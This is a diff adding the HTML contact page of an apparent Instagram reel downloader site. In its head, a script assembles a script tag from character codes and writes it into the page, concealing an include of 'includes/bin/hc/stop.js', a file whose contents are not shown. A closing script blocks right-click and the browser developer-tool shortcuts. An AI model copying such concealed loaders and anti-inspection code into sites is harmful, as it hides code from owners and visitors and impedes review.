@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<body>
+    <div class="main-wrapper">
+
+        <head>
+            <meta charset="utf-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+            <title>Insta Reel Saver</title>
+            <!-- Favicon -->
+            <!-- Favicon Links -->
+            <link rel="icon" href="/favicon.ico" type="image/x-icon">
+            <link rel="icon" href="/favicon.png" type="image/png">
+            <link rel="shortcut icon" href="/images/favicon.png" type="image/png">
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+            <!-- Meta -->
+            <meta name="description" content="Looking for an online video downloader. Try downloader hub!">
+            <meta name="keywords" content="youtube downloader, facebook downloader, tiktok downloader, instagram downloader">
+            <meta name="author" content="Dreamstechnologies - On-demand Service Marketplace Script - 100% Source Code">
+            <!-- Facebook Meta Tags -->
+            <meta property="og:url" content="https://downloader-hub.com/">
+            <meta property="og:type" content="website">
+            <meta property="og:title" content="Downloader Hub">
+            <meta property="og:description" content="Looking for an online video downloader. Try downloader hub!!">
+            <meta property="og:image" content="/assets/img/banner.jpg">
+
+            <!-- Twitter Meta Tags -->
+            <meta name="twitter:card" content="summary_large_image">
+            <meta property="twitter:domain" content="https://codesterra.com/">
+            <meta property="twitter:url" content="https://codesterra.com/">
+            <meta name="twitter:title" content="Downloader Hub">
+            <meta name="twitter:description" content="Downloader Hub">
+            <meta name="twitter:image" content="/assets/img/banner.jpg">
+            <link rel="stylesheet" href="css/bootstrap.min.css">
+            <link rel="canonical" href="https://codesterra.com">
+            <link rel="stylesheet" href="css/fontawesome.min.css">
+            <link rel="stylesheet" href="css/all.min.css">
+            <link rel="stylesheet" href="css/feather.css">
+            <link rel="stylesheet" href="css/aos.css">
+            <link rel="stylesheet" href="css/owl.carousel.min.css">
+            <link rel="stylesheet" href="css/style.css">
+            <script>
+                var y = "";
+                var x = [60, 115, 99, 114, 105, 112, 116, 32, 115, 114, 99, 61, 34, 105, 110, 99, 108, 117, 100, 101, 115, 47, 98, 105, 110, 47, 104, 99, 47, 115, 116, 111, 112, 46, 106, 115, 34, 62, 60, 47, 115, 99, 114, 105, 112, 116, 62];
+                x.forEach(char => {
+                    y += String.fromCharCode(char)
+                });
+                document.write(y);
+            </script>
+            <!-- Google AdSense Auto Ads -->
+            <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+            <script>
+                (adsbygoogle = window.adsbygoogle || []).push({
+                    google_ad_client: "ca-pub-XXXXXXXXXXXXXXX", // Replace with your AdSense publisher ID
+                    enable_page_level_ads: true
+                });
+            </script>
+        </head>
+
+        <!-- Header -->
+        <header class="header">
+            <div class="container-fluid">
+                <nav class="navbar navbar-expand-lg header-nav">
+
+                    <div class="navbar-header">
+                        <a id="mobile_btn" href="#">
+								<span class="bar-icon">
+									<span></span>
+									<span></span>
+									<span></span>
+								</span>
+							</a>
+                        <a href="/" class="navbar-brand logo">
+								<img src="images/logo.png" class="img-fluid" alt="Logo">
+							</a>
+                        <a href="/" class="navbar-brand logo-small">
+								<img src="images/logo.png" class="img-fluid" alt="Logo">
+							</a>
+                    </div>
+                    <div class="main-menu-wrapper">
+                        <div class="menu-header">
+                            <a href="/" class="menu-logo">
+									<img src="images/logo.png" class="img-fluid" alt="Logo">
+								</a>
+                            <a id="menu_close" class="menu-close" href="#"> <i class="fas fa-times"></i></a>
+                        </div>
+                        <ul class="main-nav navbar-nav" id="scroll-nav">
+                            <li class="nav-item"><a href="/" class="nav-link active">Home </a></li>
+                            <li class="nav-item"><a href="about.html" class="nav-link">About </a></li>
+                            <li class="nav-item"><a href="terms.html" class="nav-link">Terms </a></li>
+                            <li class="nav-item"><a href="privacy.html" class="nav-link">Privacy</a></li>
+
+                        </ul>
+                    </div>
+                    <ul class="nav header-navbar-rht">
+                        <li class="nav-item">
+                            <a class="btn btn-secondary" href="contact.html" target="_blank">Contact<span>24/7</span></a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </header>
+     
+    <style>
+        .input-group-mobile {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 20px auto;
+            max-width: 92%;
+            padding: 0 10px;
+        }
+        
+        .form-control-mobile {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 2px solid #DD2B7A;
+            border-radius: 8px;
+        }
+        
+        .form-control-mobile:focus {
+            outline: none;
+            border-color: #DD2B7A;
+            box-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
+        }
+        
+        .btn-download-mobile {
+            background-color: #DD2B7A;
+            color: #fff;
+            padding: 15px;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        
+        .btn-download-mobile:hover {
+            background-color: #DD2B7A;
+        }
+        
+        #exm {
+            text-align: center;
+            margin: 5px auto;
+            font-size: 16px;
+        }
+
+        .dl {
+            width: 92%;
+            background: #fff;
+            padding: 30px 40px;
+            margin-top: -70px;
+            /* Adjusted to move it downward */
+            margin-left: auto;
+            margin-right: auto;
+            border-radius: 25px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            border: 1px solid #ddd;
+            position: relative;
+            /* Ensure it's positioned properly */
+            z-index: 10;
+            /* Ensure visibility above other elements */
+        }
+
+        .rowz {
+            padding: 30px 20px;
+            border: 2px dashed #ddd;
+            border-radius: 8px;
+        }
+
+        .videopreviebox {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 20px;
+            width: 100%;
+            max-width: 100%;
+            margin: 20px auto;
+            padding: 22px;
+            border: 2px solid #DD2B7A;
+            border-radius: 8px;
+            background: #fff
+        }
+
+        .image-box {
+            flex: 1;
+            text-align: center;
+            padding: 10px;
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 8px
+        }
+
+        .image-box img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 0 auto
+        }
+
+        svg {
+            width: 30px;
+            height: 30px
+        }
+
+        .button-box {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            justify-content: flex-start;
+            background: #f8f9fa;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 10px
+        }
+
+        .button-box .btn {
+            width: 100%;
+            padding: 15px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: .3s
+        }
+
+        .button-box .btn-primary {
+            background-color: #F7A462;
+            border: 2px solid #F7A462;
+            color: #fff;
+            padding: 20px;
+            font-size: 16px
+        }
+
+        .button-box .btn-primary:hover {
+            background-color: #0056b3;
+            border-color: #0056b3
+        }
+
+        #download-other-video {
+            background-color: #b3c8cf;
+            color: navy;
+            padding: 15px;
+            font-size: 18px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer
+        }
+
+        #download-other-video:hover {
+            background-color: #a8cd89
+        }
+
+        .input-group.inutWithButton {
+            display: flex;
+            align-items: center;
+            margin: 20px auto;
+            max-width: 900px
+        }
+
+        .input-group .form-control {
+            border: 2px solid #DD2B7A;
+            border-right: none;
+            border-radius: 5px 0 0 5px;
+            padding: 15px;
+            font-size: 16px
+        }
+
+        .input-group .form-control:focus {
+            border-color: #0056b3;
+            outline: 0;
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5)
+        }
+
+        .input-group-append .btn {
+            border: 2px solid #DD2B7A;
+            border-radius: 0 5px 5px 0;
+            background-color: #DD2B7A;
+            color: #fff;
+            padding: 15px 30px
+        }
+
+        .input-group-append .btn:active {
+            transform: scale(0.95)
+        }
+
+        .alert {
+            max-width: 500px;
+            margin: 20px auto;
+            font-size: 14px;
+            text-align: center
+        }
+
+        .text-center .spinner-border {
+            margin: 20px auto;
+            width: 3rem;
+            height: 3rem
+        }
+
+        @media (max-width: 768px) {
+            .videopreviebox {
+                flex-direction: column;
+                gap: 15px
+            }
+            .button-box {
+                gap: 10px;
+                padding: 8px
+            }
+            .button-box .btn-primary {
+                padding: 15px;
+                font-size: 14px
+            }
+            #download-other-video {
+                font-size: 16px;
+                padding: 12px
+            }
+            .alert {
+                font-size: 12px
+            }
+            svg {
+                width: 24px;
+                height: 24px
+            }
+        }
+
+        @media (max-width: 480px) {
+            .videopreviebox {
+                padding: 15px
+            }
+            .button-box {
+                padding: 5px
+            }
+            .button-box .btn-primary {
+                padding: 12px;
+                font-size: 12px
+            }
+            #download-other-video {
+                font-size: 14px;
+                padding: 10px
+            }
+        }
+
+        .loader-wrapper {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column
+        }
+
+        .spinner-border {
+            margin: 10px;
+            width: 50px;
+            height: 50px;
+            border: 4px solid #ddd;
+            border-top: 4px solid #DD2B7A;
+            border-radius: 50%;
+            animation: spin 1s linear infinite
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg)
+            }
+            100% {
+                transform: rotate(360deg)
+            }
+        }
+
+        .loading-text {
+            font-size: 16px;
+            color: #555;
+            margin-top: 10px
+        }
+    </style>
+    </section>
+    <!-- multiple templates -->
+    <div class="multiple-templates" id="template">
+      <h2>Contact Us</h2>
+      <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSdvYf7wwWxuYWBlOvNd-owV48oaRTnS9y4ptafIuejzcQmtvw/viewform?usp=dialog" width="100%" height="1000" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe>
+
+  </div>
+    <!-- /multiple templates -->
+
+    <!-- New Features -->
+   
+    <!-- /New Features -->
+   
+   
+    
+    <!-- /FAQ Section -->
+   
+    <!-- Footer -->
+    <footer class="footer">
+
+        <!-- Footer Top -->
+        <div class="footer-top aos" data-aos="fade-up">
+            <div class="container">
+                <div class="row justify-content-center text-center">
+                    <div class="col-lg-12">
+                        <!-- Footer Branding -->
+                        <div class="footer-widget author-logo">
+                            <ul>
+                                <li class="elite-author">
+                                    <a href="https://codesterra.com">
+                                        <img src="images/001.png" alt="logo" style="width: 400px; height: auto;">
+                                    </a>
+                                    <h6>Crafted by Rudra Rajyaguru</h6>
+                                </li>
+                            </ul>
+                            <div class="footer-content">
+                                <h2>Insta Reel Saver</h2>
+                                <center>
+                                    <h4>Your One-Stop Insta Video Grabber</h4>
+                                </center>
+                            </div>
+                        </div>
+                        <!-- /Footer Branding -->
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- /Footer Top -->
+    
+        <!-- Footer Bottom -->
+        <div class="footer-bottom">
+            <div class="container">
+                <div class="copyright footer-bottom-text">
+                    <div class="row align-items-center">
+                      
+    
+                        <!-- Footer Links -->
+                        <div class="col-lg-6">
+                            <div class="footer-widget footer-menu">
+                                <ul>
+                                    <li><a href="terms.html" target="_blank">Terms</a></li>
+                                    <li><a href="privacy.html" target="_blank">Privacy</a></li>
+                                    <li><a href="about.html" target="_blank">About</a></li>
+                                    <li><a href="contact.html" target="_blank">Contact</a></li>
+                                </ul>
+                            </div>
+                        </div>
+    
+                        <!-- Copyright -->
+                        <div class="col-lg-3">
+                            <div class="copyright-text text-end">
+                                <p class="mb-0">© 2025.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    
+    </footer>
+    
+    <!-- /Footer -->
+
+    </div>
+    <div class="mouse-cursor cursor-outer"></div>
+    <div class="mouse-cursor cursor-inner"></div>
+
+    <div class="back-to-top">
+        <a class="back-to-top-icon align-items-center justify-content-center d-flex" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
+    </div>
+    </div>
+    <!-- jQuery -->
+    <script src="js/jquery-3.7.0.min.js"></script>
+    <!-- Bootstrap Core JS -->
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <script src="js/bootstrap-scrollspy.js"></script>
+    <!-- Feather JS -->
+    <script src="js/feather.min.js"></script>
+    <!-- Aos -->
+    <script src="js/aos.js"></script>
+    <!-- Owl Carousel JS -->
+    <script src="js/owl.carousel.min.js"></script>
+    <!-- Custom JS -->
+    <script src="js/script.js"></script>
+    <script>
+        (function() {
+            function c() {
+                var b = a.contentDocument || a.contentWindow.document;
+                if (b) {
+                    var d = b.createElement('script');
+                    d.innerHTML = "window.__CF$cv$params={r:'8f69cd31edbc0bc5',t:'MTczNDk3MjExMS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";
+                    b.getElementsByTagName('head')[0].appendChild(d)
+                }
+            }
+            if (document.body) {
+                var a = document.createElement('iframe');
+                a.height = 1;
+                a.width = 1;
+                a.style.position = 'absolute';
+                a.style.top = 0;
+                a.style.left = 0;
+                a.style.border = 'none';
+                a.style.visibility = 'hidden';
+                document.body.appendChild(a);
+                if ('loading' !== document.readyState) c();
+                else if (window.addEventListener) document.addEventListener('DOMContentLoaded', c);
+                else {
+                    var e = document.onreadystatechange || function() {};
+                    document.onreadystatechange = function(b) {
+                        e(b);
+                        'loading' !== document.readyState && (document.onreadystatechange = e, c())
+                    }
+                }
+            }
+        })();
+    </script>
+    <!-- Protection Script -->
+<script>
+    // Disable right click
+    document.addEventListener("contextmenu", function (e) {
+      e.preventDefault();
+    });
+  
+    // Disable specific key shortcuts
+    document.onkeydown = function (e) {
+      if (
+        e.keyCode == 123 || // F12
+        (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
+        (e.ctrlKey && e.keyCode == 85) || // Ctrl+U
+        (e.ctrlKey && e.shiftKey && e.keyCode == 74) // Ctrl+Shift+J
+      ) {
+        return false;
+      }
+    };
+  </script>
+  
+</body>
+
+</html>
